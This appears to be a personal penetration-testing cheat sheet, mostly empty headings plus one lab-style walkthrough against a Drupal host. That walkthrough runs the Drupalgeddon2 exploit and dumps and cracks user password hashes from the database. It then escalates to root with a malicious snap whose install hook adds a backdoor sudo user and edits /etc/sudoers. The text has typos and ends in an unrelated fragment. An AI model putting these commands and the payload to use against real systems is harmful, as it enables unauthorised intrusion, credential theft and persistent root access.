# CyberSecRef
Cyber Security Reference

# Nmap

# Netowking
## Wireshark

## Tshark

# BruteForce

## Hydra

# Cripto

# aux
## Drupal
Drupal 7, 8
searchsploit
git clone https://github.com/dreadlocked/Drupalgeddon2.git
cd Drupalgeddon2
ruby drupalgeddon2.rb http://IP

attack
cat /var/www/html/sites/default/settings.ph
# mysql to get the user hash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users;'
# break the pass
sudo hashcat -m 7900 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt --force

SSH with the Credentials

# escalate
sudo -l

# for snap
sudo apt update
sudo apt install snapd
sudo snap install --classic snapcraft

# Make an empty directory to work with
mkdir new_snap
cd new_snap
# Initialize the directory as a snap project
snapcraft init
# Set up the install hook
mkdir snap/hooks
touch snap/hooks/install
chmod a+x snap/hooks/install
# Write the script we want to execute as root
cat > snap/hooks/install << "EOF"
#!/bin/bash
password="snap_user"
pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
useradd snap_user -m -p $pass -s /bin/bash
usermod -aG sudo snap_user
echo "snap_user    ALL=(ALL:ALL) ALL" >> /etc/sudoers
EOF
# Configure the snap yaml file
cat > snap/snapcraft.yaml << "EOF"
name: snap-user
version: '0.1' 
summary: Empty snap, used for exploit
description: |
    This is an example
grade: devel
confinement: devmode
parts:
  my-part:
    plugin: nil
EOF
# Build the snap
snapcraft

# make executable
chmod +x snapcraft.sh
./snapcraft.sh

# copy to target
scp -r new_snap brucetherealadmin@10.10.10.99:/tmp

cd /tmp/new_snap
sudo snap install --devmode snap-user_0.1_amd64.snap

snap list

cat /etc/passwd

su snap_user
sudo -l
find objectiveinhouse security tools built

